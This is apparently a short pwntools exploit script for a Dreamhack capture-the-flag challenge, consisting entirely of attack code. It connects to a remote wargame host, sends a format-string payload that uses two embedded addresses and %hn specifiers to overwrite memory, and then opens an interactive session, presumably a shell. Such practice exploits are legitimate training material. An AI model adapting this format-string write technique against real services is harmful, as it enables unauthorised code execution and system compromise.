from pwn import *

r=remote("host1.dreamhack.games",10700)
print("remote success")

payload="\x26\xa0\x04\x08\x24\xa0\x04\x08%2044c%1$hn%32261c%2$hn"

r.send(payload)
r.interactive()
